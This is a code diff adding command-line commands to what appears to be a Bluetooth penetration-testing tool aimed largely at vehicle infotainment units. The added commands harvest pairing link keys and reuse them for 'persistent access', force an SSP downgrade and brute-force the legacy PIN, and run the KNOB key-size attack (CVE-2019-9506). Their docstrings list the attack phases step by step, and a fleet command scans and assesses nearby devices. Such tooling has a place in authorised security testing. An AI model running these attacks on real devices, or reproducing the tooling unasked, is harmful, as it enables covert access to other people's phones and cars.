@@ -2394,6 +2394,494 @@ def session_show(name):
 
 
 # ============================================================================
+# KEYS - Link Key Harvest & Persistent Access
+# ============================================================================
+@main.group()
+def keys():
+    """Link key harvest, storage, and persistent reconnection."""
+
+
+@keys.command("harvest")
+@click.argument("address", required=False, default=None)
+@click.option("-d", "--duration", default=300, type=int,
+              help="Capture duration in seconds (default: 300)")
+@click.option("-i", "--hci", default="hci0")
+def keys_harvest(address, duration, hci):
+    """Capture a pairing exchange and extract the link key.
+
+    \b
+    Starts HCI packet capture, waits for the target to pair,
+    then extracts and stores the link key for later reconnection.
+
+    \b
+    Usage:
+      1. Run this command
+      2. Initiate pairing from the target device (or trigger it separately)
+      3. Wait for capture to detect the pairing exchange
+      4. Link key is stored in the session key database
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.key_harvest import KeyHarvester
+    from blue_tap.utils.session import get_session
+
+    session = get_session()
+    session_dir = session.dir if session else "."
+
+    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
+    info(f"Starting link key harvest for [bold]{address}[/bold]")
+    info(f"Capturing for up to {duration}s — initiate pairing on the target now")
+
+    result = harvester.harvest(address, duration=duration)
+    if result:
+        success(f"Link key captured: {result.get('link_key', '?')[:8]}...")
+        success(f"Stored in key database for persistent access")
+        if session:
+            from blue_tap.utils.session import log_command
+            log_command("key_harvest", result, category="attack", target=address)
+    else:
+        warning("No link key captured — pairing may not have occurred during capture window")
+
+
+@keys.command("list")
+@click.option("-i", "--hci", default="hci0")
+def keys_list(hci):
+    """List all stored link keys."""
+    from blue_tap.attack.key_harvest import KeyDatabase
+    from blue_tap.utils.session import get_session
+
+    session = get_session()
+    session_dir = session.dir if session else "."
+    db_path = os.path.join(session_dir, "keys", "key_db.json")
+
+    db = KeyDatabase(db_path)
+    all_keys = db.list_all()
+
+    if not all_keys:
+        info("No stored link keys")
+        return
+
+    from rich.table import Table
+    table = Table(title="Stored Link Keys")
+    table.add_column("Device", style="bold")
+    table.add_column("Key (preview)")
+    table.add_column("Type")
+    table.add_column("Captured")
+    table.add_column("Verified", justify="center")
+    table.add_column("Source")
+
+    for entry in all_keys:
+        key_preview = entry.get("link_key", "")[:16] + "..."
+        verified = "[green]yes[/green]" if entry.get("verified") else "[dim]no[/dim]"
+        table.add_row(
+            entry.get("mac", "?"),
+            key_preview,
+            str(entry.get("key_type", "?")),
+            entry.get("captured_at", "?")[:19],
+            verified,
+            entry.get("source", "?"),
+        )
+    console.print(table)
+
+
+@keys.command("reconnect")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+def keys_reconnect(address, hci):
+    """Reconnect to a device using a previously stored link key.
+
+    \b
+    Injects the stored key into BlueZ and attempts connection
+    without re-pairing — proving persistent access.
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.key_harvest import KeyHarvester
+    from blue_tap.utils.session import get_session
+
+    session = get_session()
+    session_dir = session.dir if session else "."
+
+    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
+    info(f"Attempting reconnection to [bold]{address}[/bold] using stored key")
+
+    if harvester.reconnect(address):
+        success("Reconnected using stored link key — persistent access confirmed")
+    else:
+        error("Reconnection failed — key may be expired or device re-paired")
+
+
+@keys.command("verify")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+def keys_verify(address, hci):
+    """Verify a stored link key is still valid."""
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.key_harvest import KeyHarvester
+    from blue_tap.utils.session import get_session
+
+    session = get_session()
+    session_dir = session.dir if session else "."
+
+    harvester = KeyHarvester(hci=hci, session_dir=session_dir)
+    info(f"Verifying stored key for [bold]{address}[/bold]")
+
+    if harvester.verify_key(address):
+        success("Key is valid — device still accepts it")
+    else:
+        warning("Key verification failed — device may have re-paired or rotated keys")
+
+
+# ============================================================================
+# SSP-DOWNGRADE - Force Legacy Pairing
+# ============================================================================
+@main.group("ssp-downgrade")
+def ssp_downgrade():
+    """SSP downgrade attack — force legacy PIN pairing."""
+
+
+@ssp_downgrade.command("probe")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+def ssp_probe(address, hci):
+    """Check if target is vulnerable to SSP downgrade.
+
+    \b
+    Queries the target's pairing capabilities and determines
+    if it can be forced from Secure Simple Pairing to legacy
+    PIN mode where brute-force is possible.
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack
+
+    attack = SSPDowngradeAttack(address, hci=hci)
+    info(f"Probing SSP capabilities for [bold]{address}[/bold]")
+
+    result = attack.probe()
+    console.print()
+
+    from rich.table import Table
+    table = Table(title="SSP Probe Results")
+    table.add_column("Property", style="bold")
+    table.add_column("Value")
+
+    table.add_row("SSP Supported", "[green]Yes[/green]" if result.get("ssp_supported") else "[red]No[/red]")
+    table.add_row("IO Capability", str(result.get("io_capability", "unknown")))
+    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
+    table.add_row("Legacy Fallback", "[yellow]Possible[/yellow]" if result.get("legacy_fallback_possible") else "[green]Unlikely[/green]")
+
+    for note in result.get("notes", []):
+        table.add_row("Note", f"[dim]{note}[/dim]")
+
+    console.print(table)
+
+    from blue_tap.utils.session import log_command
+    log_command("ssp_probe", result, category="vuln", target=address)
+
+
+@ssp_downgrade.command("attack")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+@click.option("--pin-start", default=0, type=int, help="PIN range start (default: 0)")
+@click.option("--pin-end", default=9999, type=int, help="PIN range end (default: 9999)")
+@click.option("--delay", default=0.5, type=float, help="Delay between PIN attempts")
+def ssp_attack(address, hci, pin_start, pin_end, delay):
+    """Execute SSP downgrade + PIN brute force.
+
+    \b
+    Forces the target from Secure Simple Pairing to legacy PIN
+    mode, then brute-forces the PIN.
+
+    \b
+    Attack phases:
+      1. Disable local SSP, set IO cap to NoInputNoOutput
+      2. Remove existing pairing
+      3. Initiate pairing — target falls back to legacy PIN
+      4. Brute force PIN from --pin-start to --pin-end
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack
+
+    attack = SSPDowngradeAttack(address, hci=hci)
+    info(f"Starting SSP downgrade attack on [bold]{address}[/bold]")
+    info(f"PIN range: {pin_start:04d} - {pin_end:04d}, delay: {delay}s")
+
+    result = attack.downgrade_and_brute(pin_start=pin_start, pin_end=pin_end, delay=delay)
+
+    console.print()
+    if result.get("success"):
+        pin = result.get("pin_found", "?")
+        success(f"PIN found: [bold green]{pin}[/bold green]")
+        success(f"Attempts: {result.get('attempts', '?')}, Time: {result.get('time_elapsed', 0):.1f}s")
+    else:
+        warning(f"Brute force completed without finding PIN ({result.get('attempts', 0)} attempts)")
+        if result.get("lockout_detected"):
+            warning("Lockout detected — target is rate-limiting pairing attempts")
+
+    from blue_tap.utils.session import log_command
+    log_command("ssp_downgrade", result, category="attack", target=address)
+
+
+# ============================================================================
+# KNOB - Key Negotiation of Bluetooth (CVE-2019-9506)
+# ============================================================================
+@main.group()
+def knob():
+    """KNOB attack — negotiate minimum encryption key size (CVE-2019-9506)."""
+
+
+@knob.command("probe")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+def knob_probe(address, hci):
+    """Check if target is vulnerable to KNOB attack.
+
+    \b
+    Checks BT version (KNOB affects 2.1-5.0 pre-patch), reads
+    current encryption key size if connected, and checks if
+    InternalBlue is available for LMP-level manipulation.
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.knob import KNOBAttack
+
+    attack = KNOBAttack(address, hci=hci)
+    info(f"Probing KNOB vulnerability for [bold]{address}[/bold]")
+
+    result = attack.probe()
+    console.print()
+
+    from rich.table import Table
+    table = Table(title="KNOB Probe Results")
+    table.add_column("Property", style="bold")
+    table.add_column("Value")
+
+    vuln_text = "[red]Likely Vulnerable[/red]" if result.get("likely_vulnerable") else "[green]Not Vulnerable[/green]"
+    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
+    table.add_row("KNOB Vulnerable", vuln_text)
+    table.add_row("Key Size Observed", str(result.get("min_key_size_observed", "N/A")))
+    table.add_row("InternalBlue", "[green]Available[/green]" if result.get("internalblue_available") else "[dim]Not available[/dim]")
+    table.add_row("Method", result.get("method", "N/A"))
+
+    for detail in result.get("details", []):
+        table.add_row("Detail", f"[dim]{detail}[/dim]")
+
+    console.print(table)
+
+    from blue_tap.utils.session import log_command
+    log_command("knob_probe", result, category="vuln", target=address)
+
+
+@knob.command("attack")
+@click.argument("address", required=False, default=None)
+@click.option("-i", "--hci", default="hci0")
+@click.option("--key-size", default=1, type=int, help="Target key size in bytes (default: 1)")
+def knob_attack(address, hci, key_size):
+    """Execute KNOB attack — negotiate minimum key and brute force.
+
+    \b
+    Attack phases:
+      1. Negotiate minimum encryption key size with target
+      2. Brute force the reduced key space
+      3. Report results with timing analysis
+
+    \b
+    Note: Full LMP manipulation requires InternalBlue (Broadcom/Cypress).
+    Without it, uses btmgmt to set local minimum key size (limited effectiveness).
+    """
+    address = resolve_address(address)
+    if not address:
+        return
+    from blue_tap.attack.knob import KNOBAttack
+
+    attack = KNOBAttack(address, hci=hci)
+    info(f"Executing KNOB attack on [bold]{address}[/bold]")
+    info(f"Target key size: {key_size} byte(s) ({key_size * 8} bits, {2 ** (key_size * 8):,} candidates)")
+
+    result = attack.execute()
+
+    console.print()
+    negotiate = result.get("negotiate", {})
+    brute = result.get("brute_force", {})
+
+    if negotiate.get("success"):
+        success(f"Key negotiated to {negotiate.get('negotiated_key_size', '?')} byte(s)")
+    else:
+        warning(f"Key negotiation: {negotiate.get('method', 'N/A')}")
+
+    if brute.get("key_found"):
+        success(f"Key recovered: [bold green]{brute.get('key_hex', '?')}[/bold green]")
+        success(f"Candidates tested: {brute.get('total_candidates', '?')}, Time: {brute.get('time_elapsed', 0):.2f}s")
+    else:
+        info(f"Brute force demonstration: {brute.get('total_candidates', '?')} candidates in {brute.get('time_elapsed', 0):.2f}s")
+
+    from blue_tap.utils.session import log_command
+    log_command("knob_attack", result, category="attack", target=address)
+
+
+# ============================================================================
+# FLEET - Fleet-Wide Assessment
+# ============================================================================
+@main.group()
+def fleet():
+    """Fleet-wide Bluetooth assessment — scan, classify, assess multiple devices."""
+
+
+@fleet.command("scan")
+@click.option("-d", "--duration", default=15, type=int, help="Scan duration in seconds")
+@click.option("-i", "--hci", default="hci0")
+def fleet_scan(duration, hci):
+    """Scan and classify all nearby Bluetooth devices.
+
+    \b
+    Discovers Classic and BLE devices, classifies each as:
+    IVI, phone, headset, computer, wearable, or unknown.
+    """
+    from blue_tap.attack.fleet import FleetAssessment
+
+    assessment = FleetAssessment(hci=hci, scan_duration=duration)
+    info(f"Scanning for {duration}s...")
+
+    devices = assessment.scan()
+    if not devices:
+        warning("No devices discovered")
+        return
+
+    from rich.table import Table
+    table = Table(title=f"Discovered Devices ({len(devices)})")
+    table.add_column("Address", style="bold")
+    table.add_column("Name")
+    table.add_column("RSSI")
+    table.add_column("Type")
+    table.add_column("Classification", style="bold")
+
+    class_colors = {"ivi": "red", "phone": "cyan", "headset": "yellow",
+                    "computer": "blue", "wearable": "magenta", "unknown": "dim"}
+
+    for dev in devices:
+        cls = dev.get("classification", "unknown")
+        color = class_colors.get(cls, "white")
+        table.add_row(
+            dev.get("address", "?"),
+            dev.get("name", "Unknown"),
+            str(dev.get("rssi", "")),
+            dev.get("type", "Classic"),
+            f"[{color}]{cls.upper()}[/{color}]",
+        )
+    console.print(table)
+
+    ivi_count = sum(1 for d in devices if d.get("classification") == "ivi")
+    phone_count = sum(1 for d in devices if d.get("classification") == "phone")
+    info(f"Found: {ivi_count} IVI(s), {phone_count} phone(s), {len(devices) - ivi_count - phone_count} other(s)")
+
+    from blue_tap.utils.session import log_command
+    log_command("fleet_scan", devices, category="scan")
+
+
+@fleet.command("assess")
+@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
+@click.option("-i", "--hci", default="hci0")
+@click.option("--all-devices", is_flag=True, help="Assess all devices, not just IVIs")
+def fleet_assess(duration, hci, all_devices):
+    """Scan, classify, and run vulnerability assessment on all IVIs.
+
+    \b
+    By default, only assesses devices classified as IVI.
+    Use --all-devices to assess everything discovered.
+    """
+    from blue_tap.attack.fleet import FleetAssessment
+
+    assessment = FleetAssessment(hci=hci, scan_duration=duration)
+    info(f"Scanning for {duration}s...")
+
+    devices = assessment.scan()
+    if not devices:
+        warning("No devices discovered")
+        return
+
+    device_class = None if all_devices else "ivi"
+    class_label = "all devices" if all_devices else "IVIs"
+    targets_to_assess = [d["address"] for d in devices
+                         if device_class is None or d.get("classification") == device_class]
+
+    if not targets_to_assess:
+        warning(f"No {class_label} found to assess")
+        return
+
+    info(f"Assessing {len(targets_to_assess)} {class_label}...")
+    results = assessment.assess(targets=targets_to_assess)
+
+    console.print()
+    for dev_result in results:
+        addr = dev_result.get("address", "?")
+        risk = dev_result.get("risk_rating", "UNKNOWN")
+        findings = dev_result.get("findings", [])
+        risk_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
+                      "LOW": "green"}.get(risk, "dim")
+
+        console.print(f"[bold]{addr}[/bold] — [{risk_color}]{risk}[/{risk_color}] ({len(findings)} findings)")
+        for f in findings[:3]:
+            sev = f.get("severity", "?")
+            console.print(f"  [{sev.lower() if sev in ('HIGH','CRITICAL') else 'dim'}]{sev}[/] {f.get('name', '?')}")
+        if len(findings) > 3:
+            console.print(f"  [dim]... and {len(findings) - 3} more[/dim]")
+
+    report = assessment.report()
+    from blue_tap.utils.session import log_command
+    log_command("fleet_assess", report, category="vuln")
+
+    console.print()
+    success(f"Fleet assessment complete: {report.get('assessed', 0)} devices assessed, "
+            f"overall risk: [{risk_color}]{report.get('overall_risk', '?')}[/{risk_color}]")
+
+
+@fleet.command("report")
+@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
+@click.option("-i", "--hci", default="hci0")
+@click.option("-o", "--output", default=None, help="Output file path")
+@click.option("-f", "--format", "fmt", default="html", type=click.Choice(["html", "json"]))
+def fleet_report(duration, hci, output, fmt):
+    """Generate a consolidated fleet assessment report."""
+    from blue_tap.attack.fleet import FleetAssessment
+
+    assessment = FleetAssessment(hci=hci, scan_duration=duration)
+    info(f"Running full fleet assessment (scan + classify + assess)...")
+
+    devices = assessment.scan()
+    if not devices:
+        warning("No devices discovered")
+        return
+
+    ivi_targets = [d["address"] for d in devices if d.get("classification") == "ivi"]
+    if ivi_targets:
+        assessment.assess(targets=ivi_targets)
+
+    report_data = assessment.report()
+
+    out_path = output or f"fleet_report.{fmt}"
+    if fmt == "json":
+        _save_json(report_data, out_path)
+    else:
+        from blue_tap.report.generator import ReportGenerator
+        rpt = ReportGenerator()
+        rpt.add_scan_results(devices)
+        for dev in report_data.get("devices", []):
+            findings = dev.get("findings", [])
+            if findings:
+                rpt.add_vuln_findings(findings)
+        rpt.generate_html(out_path)
+
+
+# ============================================================================
 # UTILITIES
 # ============================================================================
 def _save_json(data, filepath):
